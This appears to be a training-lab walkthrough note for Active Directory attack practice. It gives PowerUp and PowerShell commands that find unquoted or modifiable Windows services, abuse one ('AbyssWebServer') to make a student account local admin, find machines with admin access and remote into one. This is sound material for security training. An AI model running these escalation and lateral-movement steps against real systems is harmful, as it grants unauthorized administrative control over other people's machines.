---
description: >-
  Task - Elevate local privs on studentvm, Identify where we have local admin
  access.
---

# Obj 5 Local Priv Esc

{% hint style="success" %}
We will be using PowerUp.ps1 for this objective
{% endhint %}

## Find Unquoted service paths

```
Get-ServiceUnquoted
```

## Find service files we can modify

```
Get-ModifiableServiceFile -Verbose
```

## Find services we can modify

```
Get-ModifiableService
```

## Abuse a service we found to be modifiable

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
```

{% hint style="warning" %}
Once we abuse this service we need to log off and back on for the escalation to take affect.
{% endhint %}

## Find where we have local admin access

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

{% hint style="warning" %}
We can now use winrs or PSSremoting to access any machines listed from the command above.
{% endhint %}

## PSSremote into another machine as local admin

```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## Jenkins....

Coming soon...
